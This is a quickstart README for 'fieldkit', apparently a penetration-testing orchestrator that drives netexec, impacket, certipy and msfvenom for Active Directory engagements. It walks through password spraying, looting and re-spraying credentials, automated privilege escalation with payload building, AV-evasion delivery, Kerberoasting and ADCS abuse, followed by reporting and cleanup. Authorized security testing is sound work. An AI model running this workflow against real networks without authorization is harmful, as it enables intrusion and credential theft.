# fieldkit — quickstart

The short version: run an engagement start to finish. One SQLite store holds everything —
stop and resume anytime. **Authorized engagements only.**

> Prereqs: your usual tools on `$PATH` (netexec/nxc, impacket, certipy, evil-winrm; for
> `poc`: msfvenom/wixl/gcc/mingw). fieldkit is stdlib-only and drives them.

## The run

```bash
# 1 — set up
fieldkit init "ACME Corp"
fieldkit config set lhost=10.10.14.9 lport=443 domain=corp.local

# 2 — scope in (pick one: single IP, a range, or a file of IPs/CIDRs)
fieldkit add hosts 10.0.0.0/24

# 3 — a credential you have
fieldkit add cred 'corp.local/jdoe:Winter2025!'

# 4 — run the loop: spray → find admins → loot → promote secrets → repeat until dry
fieldkit spray smb

# 5 — enumerate a foothold, then rank the next moves
fieldkit enum 10.0.0.7
fieldkit analyze

# 6 — escalate: walk the ranked vectors, stop at first proof
fieldkit escalate 10.0.0.7 --allow config-change

# 7 — go wide in AD (any order, optional)
fieldkit roast --dc 10.0.0.10
fieldkit delegation --dc 10.0.0.10
fieldkit adcs find --dc 10.0.0.10
fieldkit bloodhound import ./bh/

# 8 — deliver
fieldkit report --check                       # anti-fabrication gate
fieldkit report --formats md,docx -o report   # Findings + Observations
fieldkit report --cleanup -o report           # INTERNAL revert checklist
fieldkit export-recce recce.json
```

Run `fieldkit status` anytime for the board; `fieldkit analyze` re-ranks after any new fact.

## If…

- **No credential yet?** `ingest nxc run.log` (a prior capture), or spray a proto you can hit
  (`spray winrm|ssh|…`). The loop promotes any secret it loots and re-sprays it.
- **A vector needs a tool that isn't on the box?** `escalate` **auto-stages** it from the
  arsenal, or **auto-builds** it (`poc`) and stages it, then retries — nothing to do.
- **A delivery gets caught by AV?** `escalate` marks it red and **climbs the delivery ladder**
  (native → in-memory → script) automatically.
- **A route can't be one-shot** (overwrite a running service binary, plant a hijack DLL)?
  `escalate` hands it to `prep`: `fieldkit prep 10.0.0.7 writablesvc:Spooler` builds the
  payload and prints exactly where to place it and the steps.
- **Blocked by the safety gate?** Riskier vectors need `--allow config-change` (or `crash-risk`).
- **Just want to see the plan?** `fieldkit escalate <ip> --dry-run`.

## Deliverables

- `report.md` / `.docx` / `.pdf` — the customer report (proven **Findings** + **Observations**).
  Add `--proven-only` for a Findings-only version.
- `report.cleanup.md` — **internal** checklist of every change to revert. Do not send to the client.
- `recce.json` — proven findings for the recce triage tool.

More detail: **`TECHNICAL-GUIDE.md`** · the visual map: **`WORKFLOW.md`**.
